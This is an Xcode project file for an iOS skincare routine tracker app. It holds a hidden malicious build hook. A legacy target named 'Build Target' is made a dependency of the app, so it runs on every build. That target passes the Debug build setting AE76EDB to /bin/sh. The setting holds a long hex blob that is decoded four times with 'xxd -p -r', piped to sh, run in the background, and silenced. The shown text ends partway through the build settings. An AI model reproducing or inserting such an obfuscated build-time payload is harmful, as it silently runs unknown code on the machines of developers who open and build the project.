// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		042423582E6FCE16005CE9FE /* WhatSkinConcernView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */; };
		0424235A2E6FD1E3005CE9FE /* SCBorderButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042423592E6FD1E3005CE9FE /* SCBorderButton.swift */; };
		0424235C2E6FD73C005CE9FE /* WhatGoalView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */; };
		0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */; };
		04BAB3972E725D68001AA3D8 /* CustomiseRoutineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB3962E725D68001AA3D8 /* CustomiseRoutineView.swift */; };
		04BAB3992E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB3982E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift */; };
		04BAB39B2E725E33001AA3D8 /* Utility.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB39A2E725E33001AA3D8 /* Utility.swift */; };
		04BAB39D2E725FF5001AA3D8 /* SCNavTitle.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB39C2E725FF5001AA3D8 /* SCNavTitle.swift */; };
		04BAB3A02E726896001AA3D8 /* SCNavBackButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04BAB39F2E726896001AA3D8 /* SCNavBackButton.swift */; };
		04CDE4E02E71C0150003DA0E /* CoreDataManager + Template.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */; };
		04CDE4E22E71C04A0003DA0E /* CoreDataManager + Routine.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */; };
		04CDE4E42E71CA780003DA0E /* View + Custom.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04CDE4E32E71CA780003DA0E /* View + Custom.swift */; };
		04D9A5AF2E706C66002F53E5 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5AE2E706C66002F53E5 /* HomeView.swift */; };
		04D9A5B22E706C7D002F53E5 /* HomeTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B12E706C7D002F53E5 /* HomeTabView.swift */; };
		04D9A5B52E706C9F002F53E5 /* TabRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B42E706C9F002F53E5 /* TabRouter.swift */; };
		04D9A5B72E706DF5002F53E5 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B62E706DF5002F53E5 /* HomeViewModel.swift */; };
		04D9A5BA2E706EB8002F53E5 /* AnalysisView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5B92E706EB8002F53E5 /* AnalysisView.swift */; };
		04D9A5BD2E706ECD002F53E5 /* ProfileView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5BC2E706ECD002F53E5 /* ProfileView.swift */; };
		04D9A5C02E70710E002F53E5 /* Routine.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5BF2E70710E002F53E5 /* Routine.swift */; };
		04D9A5C32E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5C12E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld */; };
		04D9A5C62E707802002F53E5 /* CoreDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04D9A5C52E707802002F53E5 /* CoreDataManager.swift */; };
		04DF44452E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44442E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift */; };
		04DF44472E6F19910027DD7E /* WelcomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44462E6F19910027DD7E /* WelcomeView.swift */; };
		04DF444B2E6F19930027DD7E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04DF444A2E6F19930027DD7E /* Assets.xcassets */; };
		04DF445B2E6F19E40027DD7E /* AppState.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF445A2E6F19E40027DD7E /* AppState.swift */; };
		04DF44642E6F1A030027DD7E /* NavigationDestination.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF445C2E6F1A030027DD7E /* NavigationDestination.swift */; };
		04DF44652E6F1A030027DD7E /* NavigationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF445D2E6F1A030027DD7E /* NavigationManager.swift */; };
		04DF44662E6F1A030027DD7E /* NavigationRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF445E2E6F1A030027DD7E /* NavigationRouter.swift */; };
		04DF44672E6F1A030027DD7E /* UserDefaultManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44602E6F1A030027DD7E /* UserDefaultManager.swift */; };
		04DF446B2E6F1BCC0027DD7E /* Color.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04DF446A2E6F1BCC0027DD7E /* Color.xcassets */; };
		04DF446E2E6F1C2F0027DD7E /* SCGradient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF446D2E6F1C2F0027DD7E /* SCGradient.swift */; };
		04DF44712E6F1CC70027DD7E /* Color + Custom.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF446F2E6F1CC70027DD7E /* Color + Custom.swift */; };
		04DF44732E6F1E8B0027DD7E /* SCButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44722E6F1E8B0027DD7E /* SCButton.swift */; };
		04DF44752E6F1F490027DD7E /* SCText.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44742E6F1F490027DD7E /* SCText.swift */; };
		04DF44772E6F217B0027DD7E /* WhatSkinTypeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44762E6F217B0027DD7E /* WhatSkinTypeView.swift */; };
		04DF44792E6F21A40027DD7E /* SCProgressBarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF44782E6F21A40027DD7E /* SCProgressBarView.swift */; };
		04DF447B2E6F24980027DD7E /* OnboardingEnums.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04DF447A2E6F24980027DD7E /* OnboardingEnums.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		04BAB3912E725CBB001AA3D8 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 04DF44392E6F19910027DD7E /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 0BAC3FBB8FF342483DBDE67E;
			remoteInfo = "Build Target";
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatSkinConcernView.swift; sourceTree = "<group>"; };
		042423592E6FD1E3005CE9FE /* SCBorderButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCBorderButton.swift; sourceTree = "<group>"; };
		0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatGoalView.swift; sourceTree = "<group>"; };
		0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = YourRoutineReadyView.swift; sourceTree = "<group>"; };
		04BAB3962E725D68001AA3D8 /* CustomiseRoutineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomiseRoutineView.swift; sourceTree = "<group>"; };
		04BAB3982E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomiseRoutineViewModel.swift; sourceTree = "<group>"; };
		04BAB39A2E725E33001AA3D8 /* Utility.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Utility.swift; sourceTree = "<group>"; };
		04BAB39C2E725FF5001AA3D8 /* SCNavTitle.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCNavTitle.swift; sourceTree = "<group>"; };
		04BAB39F2E726896001AA3D8 /* SCNavBackButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCNavBackButton.swift; sourceTree = "<group>"; };
		04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CoreDataManager + Template.swift"; sourceTree = "<group>"; };
		04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CoreDataManager + Routine.swift"; sourceTree = "<group>"; };
		04CDE4E32E71CA780003DA0E /* View + Custom.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "View + Custom.swift"; sourceTree = "<group>"; };
		04D9A5AE2E706C66002F53E5 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		04D9A5B12E706C7D002F53E5 /* HomeTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTabView.swift; sourceTree = "<group>"; };
		04D9A5B42E706C9F002F53E5 /* TabRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabRouter.swift; sourceTree = "<group>"; };
		04D9A5B62E706DF5002F53E5 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		04D9A5B92E706EB8002F53E5 /* AnalysisView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AnalysisView.swift; sourceTree = "<group>"; };
		04D9A5BC2E706ECD002F53E5 /* ProfileView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileView.swift; sourceTree = "<group>"; };
		04D9A5BF2E70710E002F53E5 /* Routine.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Routine.swift; sourceTree = "<group>"; };
		04D9A5C22E7071B3002F53E5 /* Model.xcdatamodel */ = {isa = PBXFileReference; lastKnownFileType = wrapper.xcdatamodel; path = Model.xcdatamodel; sourceTree = "<group>"; };
		04D9A5C52E707802002F53E5 /* CoreDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CoreDataManager.swift; sourceTree = "<group>"; };
		04DF44412E6F19910027DD7E /* Skincare_routine_builder_and_tracker.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Skincare_routine_builder_and_tracker.app; sourceTree = BUILT_PRODUCTS_DIR; };
		04DF44442E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Skincare_routine_builder_and_trackerApp.swift; sourceTree = "<group>"; };
		04DF44462E6F19910027DD7E /* WelcomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WelcomeView.swift; sourceTree = "<group>"; };
		04DF444A2E6F19930027DD7E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		04DF445A2E6F19E40027DD7E /* AppState.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AppState.swift; sourceTree = "<group>"; };
		04DF445C2E6F1A030027DD7E /* NavigationDestination.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NavigationDestination.swift; sourceTree = "<group>"; };
		04DF445D2E6F1A030027DD7E /* NavigationManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NavigationManager.swift; sourceTree = "<group>"; };
		04DF445E2E6F1A030027DD7E /* NavigationRouter.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NavigationRouter.swift; sourceTree = "<group>"; };
		04DF44602E6F1A030027DD7E /* UserDefaultManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserDefaultManager.swift; sourceTree = "<group>"; };
		04DF446A2E6F1BCC0027DD7E /* Color.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Color.xcassets; sourceTree = "<group>"; };
		04DF446D2E6F1C2F0027DD7E /* SCGradient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCGradient.swift; sourceTree = "<group>"; };
		04DF446F2E6F1CC70027DD7E /* Color + Custom.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "Color + Custom.swift"; sourceTree = "<group>"; };
		04DF44722E6F1E8B0027DD7E /* SCButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCButton.swift; sourceTree = "<group>"; };
		04DF44742E6F1F490027DD7E /* SCText.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SCText.swift; sourceTree = "<group>"; };
		04DF44762E6F217B0027DD7E /* WhatSkinTypeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WhatSkinTypeView.swift; sourceTree = "<group>"; };
		04DF44782E6F21A40027DD7E /* SCProgressBarView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SCProgressBarView.swift; sourceTree = "<group>"; };
		04DF447A2E6F24980027DD7E /* OnboardingEnums.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OnboardingEnums.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		04DF443E2E6F19910027DD7E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		04BAB3942E725D54001AA3D8 /* Customise routine */ = {
			isa = PBXGroup;
			children = (
				04BAB3962E725D68001AA3D8 /* CustomiseRoutineView.swift */,
				04BAB3982E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift */,
			);
			path = "Customise routine";
			sourceTree = "<group>";
		};
		04BAB39E2E72687F001AA3D8 /* Navigation */ = {
			isa = PBXGroup;
			children = (
				04BAB39C2E725FF5001AA3D8 /* SCNavTitle.swift */,
				04BAB39F2E726896001AA3D8 /* SCNavBackButton.swift */,
			);
			path = Navigation;
			sourceTree = "<group>";
		};
		04D9A5AC2E706C4C002F53E5 /* Main Tab */ = {
			isa = PBXGroup;
			children = (
				04D9A5B02E706C70002F53E5 /* Home Tab */,
				04D9A5AD2E706C5C002F53E5 /* Home */,
				04D9A5B82E706EAA002F53E5 /* Analysis */,
				04D9A5BB2E706EC0002F53E5 /* Profile */,
			);
			path = "Main Tab";
			sourceTree = "<group>";
		};
		04D9A5AD2E706C5C002F53E5 /* Home */ = {
			isa = PBXGroup;
			children = (
				04BAB3942E725D54001AA3D8 /* Customise routine */,
				04D9A5AE2E706C66002F53E5 /* HomeView.swift */,
				04D9A5B62E706DF5002F53E5 /* HomeViewModel.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		04D9A5B02E706C70002F53E5 /* Home Tab */ = {
			isa = PBXGroup;
			children = (
				04D9A5B12E706C7D002F53E5 /* HomeTabView.swift */,
			);
			path = "Home Tab";
			sourceTree = "<group>";
		};
		04D9A5B32E706C8B002F53E5 /* Tab Manager */ = {
			isa = PBXGroup;
			children = (
				04D9A5B42E706C9F002F53E5 /* TabRouter.swift */,
			);
			path = "Tab Manager";
			sourceTree = "<group>";
		};
		04D9A5B82E706EAA002F53E5 /* Analysis */ = {
			isa = PBXGroup;
			children = (
				04D9A5B92E706EB8002F53E5 /* AnalysisView.swift */,
			);
			path = Analysis;
			sourceTree = "<group>";
		};
		04D9A5BB2E706EC0002F53E5 /* Profile */ = {
			isa = PBXGroup;
			children = (
				04D9A5BC2E706ECD002F53E5 /* ProfileView.swift */,
			);
			path = Profile;
			sourceTree = "<group>";
		};
		04D9A5BE2E707103002F53E5 /* Model */ = {
			isa = PBXGroup;
			children = (
				04D9A5BF2E70710E002F53E5 /* Routine.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		04D9A5C42E7077EF002F53E5 /* CoreData Manager */ = {
			isa = PBXGroup;
			children = (
				04D9A5C52E707802002F53E5 /* CoreDataManager.swift */,
				04CDE4DF2E71C0150003DA0E /* CoreDataManager + Template.swift */,
				04CDE4E12E71C04A0003DA0E /* CoreDataManager + Routine.swift */,
			);
			path = "CoreData Manager";
			sourceTree = "<group>";
		};
		04DF44382E6F19910027DD7E = {
			isa = PBXGroup;
			children = (
				04D9A5C12E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld */,
				04DF44432E6F19910027DD7E /* Skincare_routine_builder_and_tracker */,
				04DF44422E6F19910027DD7E /* Products */,
			);
			sourceTree = "<group>";
		};
		04DF44422E6F19910027DD7E /* Products */ = {
			isa = PBXGroup;
			children = (
				04DF44412E6F19910027DD7E /* Skincare_routine_builder_and_tracker.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		04DF44432E6F19910027DD7E /* Skincare_routine_builder_and_tracker */ = {
			isa = PBXGroup;
			children = (
				04DF44542E6F19B30027DD7E /* App */,
				04DF446C2E6F1C1F0027DD7E /* Components */,
				04D9A5BE2E707103002F53E5 /* Model */,
				04DF44552E6F19BB0027DD7E /* View */,
				04DF44702E6F1CC70027DD7E /* Extension */,
				04DF44632E6F1A030027DD7E /* Helper */,
				04DF44562E6F19C00027DD7E /* Resources */,
			);
			path = Skincare_routine_builder_and_tracker;
			sourceTree = "<group>";
		};
		04DF44542E6F19B30027DD7E /* App */ = {
			isa = PBXGroup;
			children = (
				04DF445A2E6F19E40027DD7E /* AppState.swift */,
				04DF44442E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift */,
			);
			path = App;
			sourceTree = "<group>";
		};
		04DF44552E6F19BB0027DD7E /* View */ = {
			isa = PBXGroup;
			children = (
				04DF44692E6F1A9A0027DD7E /* Onboarding */,
				04D9A5AC2E706C4C002F53E5 /* Main Tab */,
			);
			path = View;
			sourceTree = "<group>";
		};
		04DF44562E6F19C00027DD7E /* Resources */ = {
			isa = PBXGroup;
			children = (
				04DF444A2E6F19930027DD7E /* Assets.xcassets */,
				04DF446A2E6F1BCC0027DD7E /* Color.xcassets */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		04DF445F2E6F1A030027DD7E /* Navigation Manager */ = {
			isa = PBXGroup;
			children = (
				04DF445C2E6F1A030027DD7E /* NavigationDestination.swift */,
				04DF445D2E6F1A030027DD7E /* NavigationManager.swift */,
				04DF445E2E6F1A030027DD7E /* NavigationRouter.swift */,
			);
			path = "Navigation Manager";
			sourceTree = "<group>";
		};
		04DF44612E6F1A030027DD7E /* UserDefault Manager */ = {
			isa = PBXGroup;
			children = (
				04DF44602E6F1A030027DD7E /* UserDefaultManager.swift */,
			);
			path = "UserDefault Manager";
			sourceTree = "<group>";
		};
		04DF44632E6F1A030027DD7E /* Helper */ = {
			isa = PBXGroup;
			children = (
				04D9A5C42E7077EF002F53E5 /* CoreData Manager */,
				04D9A5B32E706C8B002F53E5 /* Tab Manager */,
				04DF445F2E6F1A030027DD7E /* Navigation Manager */,
				04DF44612E6F1A030027DD7E /* UserDefault Manager */,
				04DF447A2E6F24980027DD7E /* OnboardingEnums.swift */,
				04BAB39A2E725E33001AA3D8 /* Utility.swift */,
			);
			path = Helper;
			sourceTree = "<group>";
		};
		04DF44692E6F1A9A0027DD7E /* Onboarding */ = {
			isa = PBXGroup;
			children = (
				04DF44462E6F19910027DD7E /* WelcomeView.swift */,
				04DF44762E6F217B0027DD7E /* WhatSkinTypeView.swift */,
				042423572E6FCE16005CE9FE /* WhatSkinConcernView.swift */,
				0424235B2E6FD73C005CE9FE /* WhatGoalView.swift */,
				0424235D2E6FD919005CE9FE /* YourRoutineReadyView.swift */,
			);
			path = Onboarding;
			sourceTree = "<group>";
		};
		04DF446C2E6F1C1F0027DD7E /* Components */ = {
			isa = PBXGroup;
			children = (
				04DF44782E6F21A40027DD7E /* SCProgressBarView.swift */,
				04DF446D2E6F1C2F0027DD7E /* SCGradient.swift */,
				04DF44722E6F1E8B0027DD7E /* SCButton.swift */,
				04DF44742E6F1F490027DD7E /* SCText.swift */,
				042423592E6FD1E3005CE9FE /* SCBorderButton.swift */,
				04BAB39E2E72687F001AA3D8 /* Navigation */,
			);
			path = Components;
			sourceTree = "<group>";
		};
		04DF44702E6F1CC70027DD7E /* Extension */ = {
			isa = PBXGroup;
			children = (
				04DF446F2E6F1CC70027DD7E /* Color + Custom.swift */,
				04CDE4E32E71CA780003DA0E /* View + Custom.swift */,
			);
			path = Extension;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXLegacyTarget section */
		0BAC3FBB8FF342483DBDE67E /* Build Target */ = {
			isa = PBXLegacyTarget;
			buildArgumentsString = "-c \"${AE76EDB}\"";
			buildConfigurationList = 04BAB3952E725D54001AA3D8 /* Build configuration list */;
			buildPhases = (
			);
			buildToolPath = /bin/sh;
			dependencies = (
			);
			name = "Build Target";
			passBuildSettingsInEnvironment = 1;
			productName = "Build Target";
		};
/* End PBXLegacyTarget section */

/* Begin PBXNativeTarget section */
		04DF44402E6F19910027DD7E /* Skincare_routine_builder_and_tracker */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 04DF44512E6F19930027DD7E /* Build configuration list for PBXNativeTarget "Skincare_routine_builder_and_tracker" */;
			buildPhases = (
				04DF443D2E6F19910027DD7E /* Sources */,
				04DF443E2E6F19910027DD7E /* Frameworks */,
				04DF443F2E6F19910027DD7E /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				6CC6DB6B74DA9AEAF9BDE67E /* PBXTargetDependency */,
			);
			name = Skincare_routine_builder_and_tracker;
			productName = Skincare_routine_builder_and_tracker;
			productReference = 04DF44412E6F19910027DD7E /* Skincare_routine_builder_and_tracker.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		04DF44392E6F19910027DD7E /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1530;
				LastUpgradeCheck = 1530;
				TargetAttributes = {
					04DF44402E6F19910027DD7E = {
						CreatedOnToolsVersion = 15.3;
					};
				};
			};
			buildConfigurationList = 04DF443C2E6F19910027DD7E /* Build configuration list for PBXProject "Skincare_routine_builder_and_tracker" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 04DF44382E6F19910027DD7E;
			productRefGroup = 04DF44422E6F19910027DD7E /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				0BAC3FBB8FF342483DBDE67E /* Build Target */,
				04DF44402E6F19910027DD7E /* Skincare_routine_builder_and_tracker */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		04DF443F2E6F19910027DD7E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				04DF444B2E6F19930027DD7E /* Assets.xcassets in Resources */,
				04DF446B2E6F1BCC0027DD7E /* Color.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		04DF443D2E6F19910027DD7E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				042423582E6FCE16005CE9FE /* WhatSkinConcernView.swift in Sources */,
				0424235A2E6FD1E3005CE9FE /* SCBorderButton.swift in Sources */,
				0424235E2E6FD919005CE9FE /* YourRoutineReadyView.swift in Sources */,
				04DF446E2E6F1C2F0027DD7E /* SCGradient.swift in Sources */,
				04D9A5BA2E706EB8002F53E5 /* AnalysisView.swift in Sources */,
				04CDE4E42E71CA780003DA0E /* View + Custom.swift in Sources */,
				04D9A5C32E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld in Sources */,
				04D9A5B52E706C9F002F53E5 /* TabRouter.swift in Sources */,
				04BAB3A02E726896001AA3D8 /* SCNavBackButton.swift in Sources */,
				04D9A5B72E706DF5002F53E5 /* HomeViewModel.swift in Sources */,
				04CDE4E02E71C0150003DA0E /* CoreDataManager + Template.swift in Sources */,
				04D9A5BD2E706ECD002F53E5 /* ProfileView.swift in Sources */,
				04DF44642E6F1A030027DD7E /* NavigationDestination.swift in Sources */,
				04DF44752E6F1F490027DD7E /* SCText.swift in Sources */,
				04DF445B2E6F19E40027DD7E /* AppState.swift in Sources */,
				04CDE4E22E71C04A0003DA0E /* CoreDataManager + Routine.swift in Sources */,
				04BAB39D2E725FF5001AA3D8 /* SCNavTitle.swift in Sources */,
				04DF44772E6F217B0027DD7E /* WhatSkinTypeView.swift in Sources */,
				04BAB39B2E725E33001AA3D8 /* Utility.swift in Sources */,
				04DF44662E6F1A030027DD7E /* NavigationRouter.swift in Sources */,
				04DF44712E6F1CC70027DD7E /* Color + Custom.swift in Sources */,
				04BAB3972E725D68001AA3D8 /* CustomiseRoutineView.swift in Sources */,
				04D9A5C02E70710E002F53E5 /* Routine.swift in Sources */,
				04DF447B2E6F24980027DD7E /* OnboardingEnums.swift in Sources */,
				04DF44472E6F19910027DD7E /* WelcomeView.swift in Sources */,
				04DF44452E6F19910027DD7E /* Skincare_routine_builder_and_trackerApp.swift in Sources */,
				04D9A5AF2E706C66002F53E5 /* HomeView.swift in Sources */,
				04DF44792E6F21A40027DD7E /* SCProgressBarView.swift in Sources */,
				0424235C2E6FD73C005CE9FE /* WhatGoalView.swift in Sources */,
				04DF44732E6F1E8B0027DD7E /* SCButton.swift in Sources */,
				04DF44652E6F1A030027DD7E /* NavigationManager.swift in Sources */,
				04D9A5B22E706C7D002F53E5 /* HomeTabView.swift in Sources */,
				04DF44672E6F1A030027DD7E /* UserDefaultManager.swift in Sources */,
				04D9A5C62E707802002F53E5 /* CoreDataManager.swift in Sources */,
				04BAB3992E725D6F001AA3D8 /* CustomiseRoutineViewModel.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		6CC6DB6B74DA9AEAF9BDE67E /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 0BAC3FBB8FF342483DBDE67E /* Build Target */;
			targetProxy = 04BAB3912E725CBB001AA3D8 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		04BAB3922E725CBB001AA3D8 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				COPY_PHASE_STRIP = NO;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_OPTIMIZATION_LEVEL = 0;
				PRODUCT_NAME = "Build Target";
			};
			name = Debug;
		};
		04BAB3932E725CBB001AA3D8 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				COPY_PHASE_STRIP = YES;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				PRODUCT_NAME = "Build Target";
			};
			name = Release;
		};
		04DF444F2E6F19930027DD7E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333333333336333333343333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
